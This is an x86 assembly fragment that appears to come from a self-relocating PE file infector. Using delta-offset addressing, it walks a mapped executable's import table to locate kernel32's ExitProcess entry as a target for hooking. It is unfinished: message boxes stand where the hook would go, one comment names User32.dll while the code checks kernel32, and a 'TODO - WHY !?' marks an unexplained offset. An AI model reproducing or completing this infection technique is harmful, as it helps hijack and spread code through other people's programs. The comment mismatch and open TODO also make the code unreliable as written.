; IAT Hooking (ExitProcess)
; Check if valid
cmp	[DELTA OffsetIAT], 0
je	doNotHook
; Get IAT
mov	edi, ebx ; VA IAT
mov	eax, [DELTA OffsetIAT]
sub	edi, eax
mov	eax, [DELTA PeFileMap]
add	edi, eax ; IAT

push	esi ; Keep start section
; Iterate on all IAT Modules
iterateIAT:
mov	edx, edi
add	edx, 0Ch ; Dll Name
mov	edx, [edx] ; VA
cmp	edx, 0
je	doNotHook
mov	eax, [DELTA PeFileMap]
add	edx, eax
mov	eax, [DELTA OffsetIAT]
sub	edx, eax
; Check if we found User32.dll
push	edx
mov	ecx, offset sKernel32
add	ecx, ebp
call	stricmp
pop	edx
cmp	eax, 0
jne	endIterateFunc

pusha
push	0
push	edx
push	edx
push	0
call	[DELTA pMessageBox]
popa

; Iterate on all Imported Functions
mov	edx, edi
mov	edx, [edx]
mov	eax, [DELTA PeFileMap]
add	edx, eax
mov	eax, [DELTA OffsetIAT]
sub	edx, eax
xor	esi, esi
iterateFunc:
mov	ebx, [edx]
cmp	ebx, 0
je	endIterateFunc
mov	eax, [DELTA PeFileMap]
add	ebx, eax
mov	eax, [DELTA OffsetIAT]
sub	ebx, eax
add	ebx, 2 ; TODO - WHY !?
; Check if we found ExitProcess
push	edx
push	ecx
mov	ecx, offset sExitProcess
add	ecx, ebp
mov	edx, ebx
call	stricmp
pop	ecx
pop	edx
cmp	eax, 0
jne	nextIterateFunc

pusha
push	0
push	ebx
push	ebx
push	0
call	[DELTA pMessageBox]
popa

nextIterateFunc:
add	edx, 4
inc	esi
jmp	iterateFunc
endIterateFunc:

add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
jmp	iterateIAT
doNotHook:
pop	esi
